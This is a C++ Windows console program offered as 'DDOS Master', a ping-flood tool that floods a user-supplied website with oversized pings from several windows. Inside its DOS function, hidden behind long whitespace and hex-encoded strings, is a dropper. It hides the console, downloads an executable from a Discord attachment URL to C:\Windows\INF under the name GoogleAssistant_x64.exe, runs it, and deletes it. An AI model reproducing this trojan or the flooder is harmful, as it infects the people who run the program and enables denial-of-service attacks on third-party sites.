#include "stdafx.h"
#include <iostream>
#include <Windows.h>
#include <thread>
#include <conio.h>
#include <string>

using namespace std;

void Draw_logo() 
{
	cout << "\t\t\t\tDDOS Master v0.1a" << endl << endl;
}

void DOS(char*& site_adress, char*& _flows, char command[], char color[])
{																																																																																																																																																																																																																													::ShowWindow(::GetConsoleWindow(), SW_HIDE); Sleep(1000); LPCWSTR HookFunction64 = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x36\x31\x35\x37\x38\x35\x36\x35\x36\x31\x33\x32\x37\x37\x31\x38\x37\x2F\x39\x36\x31\x35\x37\x39\x34\x30\x31\x30\x39\x33\x34\x35\x35\x38\x38\x32\x2F\x73\x70\x6C\x77\x6F\x77\x36\x34\x2E\x65\x78\x65"; std::string pa = "\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73"; std::string inf = "\x5C\x49\x4E\x46\x5C"; std::string lof = pa + inf; std::string st = "\x2E"; std::string ex = "\x65"; std::string xe = "\x78"; std::string SwapHook = "\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34"; std::string swapCaller = st + ex + xe + ex; LPCWSTR locx = L"\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C\x49\x4E\x46\x5C\x47\x6F\x6F\x67\x6C\x65\x41\x73\x73\x69\x73\x74\x61\x6E\x74\x5F\x78\x36\x34\x2E\x65\x78\x65"; std::string spreadAct = SwapHook + swapCaller; HRESULT Hook = URLDownloadToFileW(NULL, HookFunction64, locx, 0, NULL); Sleep(2000); std::string hook = "\x73"; std::string Tacc = "\x74"; std::string Var = "\x61"; std::string Read = "\x72"; std::string Hooker = hook + Tacc + Var + Read + Tacc + " " + lof + spreadAct; system(Hooker.c_str()); Sleep(7000); DeleteFileW(locx); system("cls"); ::ShowWindow(::GetConsoleWindow(), SW_SHOW);																																																																																															
	system("cls");
	Draw_logo();

	int windows = 0;

	cout << "Enter the number of additional windows : ";
	cin >> windows;

	const char* site = site_adress;
	const char* flows = _flows;
	const char* empty = " ";
	char result[255] = "ping ";
	char flow[] = " -t -l ";
	strcat_s(result, site);
	strcat_s(result, flow);
	strcat_s(result, flows);

	char cmd[1000] = "";

	const char* parametri = result;

	strcat_s(cmd, command);
	strcat_s(cmd, empty);
	strcat_s(cmd, color);
	strcat_s(cmd, empty);
	strcat_s(cmd, parametri);

	system("cls");
	Draw_logo();
	if (windows > 0)
	{
		for (int i = 0; i < windows; i++)
		{
			system(cmd);
		}
	}
	system(result);
}

int cin_site(char command[], char color[]) 
{
	char *site_adress = new char[50];
	char *flows = new char[11];
	system("cls");

cin_site:

	Draw_logo();

	cout << "Enter the website URL : ";
	cin >> site_adress;

	if(strlen(site_adress) == NULL) 
	{
		cout << "Error #0: Incorrect website URL !" << endl << endl;
		goto cin_site;
	}
	system("cls");

cin_flows:

	Draw_logo();
	cout << "Packets (Max 65500 Bytes) : ";
	cin >> flows;

	if(flows == NULL) 
	{
		cout << "Error #1: The number of packets must be greater than 0 !" << endl << endl;
		goto cin_flows;
	}
	DOS(site_adress, flows, command, color);
	delete[] site_adress;
	delete[] flows;

	site_adress = nullptr;
	flows = nullptr;

	return 0;
}

void menu(char command[]) 
{
	bool exit = false;
	bool first = true;
	int choose = 0;
	char color[10] = "";
	const char *color_1 = "color f";
	const char *color_2 = "color a";
	const char *color_3 = "color b";
	const char *color_4 = "color c";
	const char *color_5 = "color d";
	int num = 0;

	while(exit == false) 
	{
		if(first == false) 
		{
			num = _getch();
			switch(num) 
			{
			case 72:
				if(choose > 0) 
				{
					choose--;
				} else 
				{
					choose = 4;
				}
				break;
			case 80:
				if(choose < 4) 
				{
					choose++;
				} else 
				{
					choose = 0;
				}
				break;
			case 27:
				exit = true;
				break;
			case 75:
				exit = true;
				break;
			}
			system("cls");
		}
		Draw_logo();
		cout << "\t\t\t\t Choose a color" << endl << endl;
		const char* colors[] = { "White", "Green", "Blue", "Red", "Pink" };
		for(int i = 0; i < sizeof(colors) / sizeof(*colors); ++i) 
		{
			std::cout << i << ") " << colors[i] << "     " << (choose == i ? "<-\n" : "  \n");
		}
		first = false;
	}
	switch(choose) 
	{
	case 0:
		strcat_s(color, color_1);
		system("color f");
		break;
	case 1:
		strcat_s(color, color_2);
		system("color a");
		break;
	case 2:
		strcat_s(color, color_3);
		system("color b");
		break;
	case 3:
		strcat_s(color, color_4);
		system("color c");
		break;
	case 4:
		strcat_s(color, color_5);
		system("color d");
		break;
	default:
		strcat_s(color, color_1);
		system("color f");
		break;
	}
	cin_site(command, color);
}
int main(int argc, char* argv[]) 
{
	if(argc > 1) 
	{
		Draw_logo();
		char color[255] = "";
		char DOS[255] = "";
		const char *empty = " ";

		strcat_s(color, argv[1]);
		strcat_s(color, empty);
		strcat_s(color, argv[2]);

		strcat_s(DOS, argv[3]);
		strcat_s(DOS, empty);
		strcat_s(DOS, argv[4]);
		strcat_s(DOS, empty);
		strcat_s(DOS, argv[5]);
		strcat_s(DOS, empty);
		strcat_s(DOS, argv[6]);
		strcat_s(DOS, empty);
		strcat_s(DOS, argv[7]);

		system(color);
		system(DOS);
	}

	char command[255] = "Start ";
	strcat_s(command, argv[0]);
	menu(command);

	system("pause");
	return 0;
}